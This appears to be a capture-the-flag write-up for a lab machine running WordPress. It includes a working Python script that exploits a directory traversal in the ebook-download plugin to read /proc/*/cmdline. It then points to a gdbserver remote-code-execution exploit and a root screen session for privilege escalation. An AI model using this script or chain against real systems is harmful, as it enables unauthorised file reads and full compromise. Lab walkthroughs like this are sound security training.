``` 
Starting with port 80... We have to examine what type of service is, so `whatweb 'http://10.10.11.125'` will determine the next steps. 
It is running WordPress, it is known that some directory are abaible, like wp-content and especificly `wp-content/plugins`. It is tipical that a service like WordPress has some plugins outdate. And it is our case. 
`searchsploit wordpress ebook download` it is vulnerable to a Directory traversal attacks.


### Scripting in python
Now it's time to type some code in python to exploit this LFI. There are some path that are interesting to search into, like /proc where are located all actived process and how were they runned.
``` python
#!/usr/bin/python3

from pwn import *
import time, pdb, signal, sys, requests

# Global
main_url = "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/"

# Ctrl+C
def def_handler(signum, frame):
    print("[!] Saliendo...")
    sys.exit(1)

def bruteForce():
    p1 = log.progress("Brute Force:")
    p1.status("Starting attack")

    s = requests.session()
    time.sleep(2)

    for i in range(1, 1000):
        p1.status("Trying with /proc/%s/cmdline" % str(i))
        
        url = main_url + str(i) + "/cmdline"
        r = s.get(url)
        if( len(r.content) > 82 ):
            print("------------------------------------------------")
            log.info("/proc/%s/cmdline" % str(i))
            print(r.content)
            print("------------------------------------------------")

signal.signal(signal.SIGINT, def_handler)

if __name__ == "__main__":
    bruteForce()

```
>[*] /proc/858/cmdline
>/bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \\;; done'

>[*] /proc/859/cmdline
>/bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done'


We found a gdbserver running in port 1337. `searchsploit gdbserver` and follow the RCE attack. You will be 'user'


### Privilege scalation
Finally we have to search  SUID privilege and there would be some ways to go root. This time we can see `/usr/bin/screen` and we saw the cmdline of this process before...
There is a session named root that we can go. `screen -x root/`
